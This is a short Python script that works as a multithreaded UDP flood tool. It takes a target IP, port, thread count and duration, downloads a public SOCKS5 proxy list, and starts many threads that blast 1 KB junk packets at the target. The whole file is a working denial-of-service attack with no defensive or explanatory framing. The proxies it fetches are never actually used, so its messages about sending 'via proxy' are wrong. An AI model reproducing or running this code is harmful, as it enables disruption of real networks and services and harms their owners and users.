import socket
import threading
import time
import sys
import requests

def get_proxy_list():
    try:
        url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all"
        response = requests.get(url)
        if response.status_code == 200:
            return response.text.strip().split("\n")
        else:
            print("Failed to fetch proxy list. Status code:", response.status_code)
    except Exception as e:
        print("Failed to fetch proxy list:", str(e))
    return []

def udp_flood(target_ip, target_port, payload, duration, proxy):
    proxy_host, proxy_port = proxy.split(":")
    proxy_addr = (proxy_host, int(proxy_port))

    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_socket.settimeout(10)
    timeout = duration / 1
    end_time = time.time() + timeout
    while time.time() < end_time:
        try:
            udp_socket.sendto(payload, (target_ip, target_port))
        except Exception as e:
            print("Failed to send UDP packet via proxy", proxy, ":", str(e))
            break
    udp_socket.close()

def main():
    if len(sys.argv) != 5:
        print("Usage: python script.py <target_ip> <target_port> <num_threads> <duration>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    num_threads = int(sys.argv[3])
    duration = int(sys.argv[4])
    payload = b'X' * 1024

    proxy_list = get_proxy_list()
    if not proxy_list:
        print("No SOCKS5 proxies available.")
        sys.exit(1)

    threads = []
    for _ in range(num_threads):
        for proxy in proxy_list:
            thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, payload, duration, proxy))
            thread.start()
            threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
